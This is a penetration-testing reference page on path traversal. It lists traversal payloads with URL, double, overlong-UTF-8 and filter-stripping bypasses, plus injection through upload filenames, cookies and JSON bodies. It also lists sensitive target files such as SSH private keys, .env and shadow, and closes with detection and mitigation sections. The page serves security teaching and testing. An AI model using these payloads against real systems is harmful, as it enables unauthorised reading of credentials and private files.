% Filename: 04-web-testing/file-attacks/path-traversal.md
% Display name: Path Traversal
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0009 (Collection)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application), T1005 (Data from Local System)
% Authors: @TristanInSec

# Path Traversal

## Overview

Path traversal (directory traversal) allows attackers to read or write files outside the intended directory by manipulating file path parameters with `../` sequences or equivalent encodings. Unlike file inclusion, path traversal reads raw file content without executing it — the primary impact is information disclosure (source code, configuration files, credentials, SSH keys).

Path traversal can exist in any language/framework, not just PHP. It affects file download endpoints, image serving, template loading, report generation, and any functionality that resolves user-controlled paths to filesystem locations.

## ATT&CK Mapping

- **Tactic:** TA0009 - Collection
- **Technique:** T1005 - Data from Local System
- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Application accesses files based on user-controlled path input
- Insufficient validation of path components before file access
- Web server process has read permissions on target files

## Detection Methodology

### Identifying Traversal Points

Look for parameters that reference files or paths:

```text
http://target.com/download?file=report.pdf
http://target.com/image?path=photos/profile.jpg
http://target.com/static?resource=style.css
http://target.com/api/export?template=default
http://target.com/read?doc=manual.txt
```

Also test non-obvious inputs: `filename` parameters in `Content-Disposition` headers, path segments in REST URLs (`/api/files/photos/image.png`), and values in JSON/XML request bodies.

### Boundary Testing

```bash
# Basic traversal
../../../etc/passwd
..\..\..\windows\win.ini

# Encoded variants
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# Double encoding
..%252f..%252f..%252fetc/passwd

# Absolute path (bypass relative-only handling)
/etc/passwd
C:\windows\win.ini
```

## Techniques

### Basic Traversal

```bash
# Linux
?file=../../../etc/passwd
?file=../../../etc/hostname
?file=../../../proc/self/environ

# Windows
?file=..\..\..\windows\win.ini
?file=..\..\..\windows\system32\drivers\etc\hosts
```

Start with excess `../` — extra traversals at the root are ignored on both Linux and Windows.

### Encoding Bypass

**URL encoding (`../` = `%2e%2e%2f`):**

```text
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
?file=..%2f..%2f..%2fetc/passwd
?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**Double URL encoding (when the server decodes twice):**

```text
?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
?file=..%252f..%252f..%252fetc/passwd
```

**Overlong UTF-8 encoding:**

```text
?file=..%c0%af..%c0%af..%c0%afetc/passwd
?file=..%ef%bc%8f..%ef%bc%8fetc/passwd
```

**Backslash (Windows, or servers normalizing to forward slash):**

```text
?file=..\..\..\..\etc\passwd
?file=..%5c..%5c..%5cetc/passwd
```

### Filter Bypass Techniques

**Stripped `../` (if the filter removes `../` once):**

```text
?file=....//....//....//etc/passwd
?file=..././..././..././etc/passwd
?file=....\/....\/....\/etc/passwd
```

**Required base directory prefix:**

If the application requires the path to start with an expected directory:

```text
?file=/var/www/images/../../../etc/passwd
?file=images/../../../etc/passwd
```

**Null byte termination (older languages/runtimes):**

```text
?file=../../../etc/passwd%00.png
?file=../../../etc/passwd\0.png
```

Terminates the string before the appended extension. Fixed in PHP 5.3.4+ and modern runtimes.

**Absolute path injection (bypassing relative path handling):**

```text
?file=/etc/passwd
?file=C:\windows\win.ini
```

Some applications only filter relative traversal but accept absolute paths.

### Path Traversal via Non-Standard Inputs

**Filename in upload/download:**

```text
Content-Disposition: form-data; name="file"; filename="../../../etc/cron.d/malicious"
```

**REST path segments:**

```text
GET /api/files/..%2f..%2f..%2fetc/passwd HTTP/1.1
```

**Cookie values:**

```text
Cookie: lang=../../../etc/passwd
```

**JSON/XML request bodies:**

```json
{"template": "../../../etc/passwd"}
```

### Targeted Files by Platform

**Linux — Application Secrets:**

```text
/var/www/html/.env                   (Laravel, Node.js environment)
/var/www/html/config.php             (PHP applications)
/var/www/html/wp-config.php          (WordPress)
/var/www/html/configuration.php      (Joomla)
/var/www/html/settings.py            (Django)
/opt/app/config/database.yml         (Rails)
/opt/app/.git/config                 (Git repository config)
/opt/app/.git/HEAD                   (Git HEAD reference)
```

**Linux — System Files:**

```text
/etc/passwd                          (user enumeration)
/etc/shadow                          (password hashes — requires root)
/etc/hosts                           (hostname mapping)
/etc/crontab                         (scheduled tasks)
/etc/ssh/sshd_config                 (SSH configuration)
/home/<user>/.ssh/id_rsa             (SSH private key)
/home/<user>/.ssh/authorized_keys    (authorized SSH keys)
/home/<user>/.bash_history           (command history)
/proc/self/environ                   (environment variables)
/proc/self/cmdline                   (running process command)
/proc/self/status                    (process info including UID)
/proc/net/tcp                        (active network connections)
```

**Windows — Application and System:**

```text
C:\inetpub\wwwroot\web.config        (IIS config — connection strings)
C:\Windows\win.ini                   (confirm read)
C:\Windows\System32\drivers\etc\hosts
C:\Windows\debug\NetSetup.log
C:\Users\<user>\.ssh\id_rsa
C:\Windows\System32\config\SAM       (requires SYSTEM — rarely readable)
```

## Detection Methods

### Network-Based Detection

- Path traversal sequences in HTTP parameters (`../`, `..%2f`, `%2e%2e/`, `..\\`, `..%5c`)
- Requests referencing known sensitive files (`/etc/passwd`, `win.ini`, `web.config`, `.env`)
- Overlong UTF-8 sequences in URL parameters (`%c0%af`)
- Double-encoded dots and slashes (`%252e`, `%252f`)

### Host-Based Detection

- Web server process accessing files outside the document root
- File access audit logs showing reads of sensitive system files by the web server user
- SELinux/AppArmor denials for out-of-scope file access
- Repeated failed file access attempts with traversal patterns in application logs

## Mitigation Strategies

- **Avoid using user input in file paths** — map user-selectable options to an index (e.g., `file=1` maps to `report_q1.pdf` server-side). Never pass filenames or paths directly from user input to filesystem operations
- **Canonicalize and validate** — resolve the full path using `realpath()` (PHP), `os.path.realpath()` (Python), or `Path.toRealPath()` (Java), then verify the resolved path starts with the intended base directory
- **Input validation** — reject `../`, `..\\`, null bytes, URL-encoded variants, and absolute paths. Use an allowlist of permitted characters (alphanumeric, hyphen, underscore)
- **Chroot/sandbox** — run the web application in a chroot jail or container so traversal cannot escape the application filesystem
- **Least privilege** — the web server user should only have read access to files it genuinely needs. Remove read permissions on sensitive files (`/etc/shadow`, SSH keys, application configs) for the web server user

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

### MITRE ATT&CK

- [T1005 - Data from Local System](https://attack.mitre.org/techniques/T1005/)
- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
